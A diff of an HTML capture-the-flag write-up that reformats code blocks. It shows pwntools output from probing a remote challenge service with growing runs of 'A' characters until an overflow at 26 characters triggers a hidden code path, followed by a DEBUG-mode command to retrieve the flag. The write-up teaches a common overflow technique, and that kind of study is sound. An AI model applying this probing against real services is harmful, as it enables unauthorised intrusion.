@@ -80,32 +80,32 @@
 <span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a></span>
 <span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>conn.close()</span></code></pre></div>
 <p>Running it, we get:</p>
-<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python3 get.py</span>
-<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="ex">16</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">17</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ex">18</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">19</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">20</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a><span class="ex">21</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a><span class="ex">22</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="ex">23</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="ex">24</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a><span class="ex">25</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a><span class="ex">26</span> b<span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;</span></span>
-<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a><span class="ex">Traceback</span> <span class="er">(</span><span class="ex">most</span> recent call last<span class="kw">)</span><span class="bu">:</span></span>
-<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;attack.py&quot;</span>, line 5, in <span class="op">&lt;</span>module<span class="op">&gt;</span></span>
-<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>    <span class="ex">conn.recvuntil</span><span class="er">(</span><span class="ex">b</span><span class="st">&#39;Feed the cookie monster: &#39;</span><span class="kw">)</span></span>
-<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py&quot;</span>, line 333, in recvuntil</span>
-<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>    <span class="ex">res</span> = self.recv<span class="er">(</span><span class="va">timeout</span><span class="op">=</span>self.timeout<span class="kw">)</span></span>
-<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py&quot;</span>, line 105, in recv</span>
-<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="ex">self._recv</span><span class="er">(</span><span class="ex">numb,</span> timeout<span class="kw">)</span> <span class="ex">or</span> b<span class="st">&#39;&#39;</span></span>
-<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py&quot;</span>, line 183, in _recv</span>
-<span id="cb3-21"><a href="#cb3-21" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="ex">not</span> self.buffer and not self._fillbuffer<span class="er">(</span><span class="ex">timeout</span><span class="kw">)</span><span class="bu">:</span></span>
-<span id="cb3-22"><a href="#cb3-22" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py&quot;</span>, line 154, in _fillbuffer</span>
-<span id="cb3-23"><a href="#cb3-23" aria-hidden="true" tabindex="-1"></a>    <span class="ex">data</span> = self.recv_raw<span class="er">(</span><span class="fu">self.buffer.get_fill_size()</span><span class="kw">)</span></span>
-<span id="cb3-24"><a href="#cb3-24" aria-hidden="true" tabindex="-1"></a>  <span class="ex">File</span> <span class="st">&quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/sock.py&quot;</span>, line 56, in recv_raw</span>
-<span id="cb3-25"><a href="#cb3-25" aria-hidden="true" tabindex="-1"></a>    <span class="ex">raise</span> EOFError</span>
-<span id="cb3-26"><a href="#cb3-26" aria-hidden="true" tabindex="-1"></a><span class="ex">EOFError</span></span>
-<span id="cb3-27"><a href="#cb3-27" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Closed connection to 13.210.180.94 port 10001</span></code></pre></div>
+<pre class="term"><code>$ python3 get.py
+16 b&#39;AAAAAAAAAAAAAAAAEIKOOC\n&#39;
+17 b&#39;AAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+18 b&#39;AAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+19 b&#39;AAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+20 b&#39;AAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+21 b&#39;AAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+22 b&#39;AAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+23 b&#39;AAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+24 b&#39;AAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+25 b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+26 b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAEIKOOC\n&#39;
+Traceback (most recent call last):
+  File &quot;attack.py&quot;, line 5, in &lt;module&gt;
+    conn.recvuntil(b&#39;Feed the cookie monster: &#39;)
+  File &quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py&quot;, line 333, in recvuntil
+    res = self.recv(timeout=self.timeout)
+  File &quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py&quot;, line 105, in recv
+    return self._recv(numb, timeout) or b&#39;&#39;
+  File &quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py&quot;, line 183, in _recv
+    if not self.buffer and not self._fillbuffer(timeout):
+  File &quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/tube.py&quot;, line 154, in _fillbuffer
+    data = self.recv_raw(self.buffer.get_fill_size())
+  File &quot;/Library/Frameworks/Python.framework/Versions/3.7/lib/python3.7/site-packages/pwnlib/tubes/sock.py&quot;, line 56, in recv_raw
+    raise EOFError
+EOFError
+[*] Closed connection to 13.210.180.94 port 10001</code></pre>
 <p>Which tells us that 26 A’s caused the program to exit without giving us another “Feed the cookie monster:” message. In other words, we’ve found the right number of A’s to trigger the <code>oppsie</code> code! We can now manually enter in the correct string to get the flag, or alternately run pwntools in DEBUG mode so that it returns the final message before the program crashed.</p>
-<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python3 get.py DEBUG</span></code></pre></div>
+<pre class="term"><code>$ python3 get.py DEBUG</code></pre>
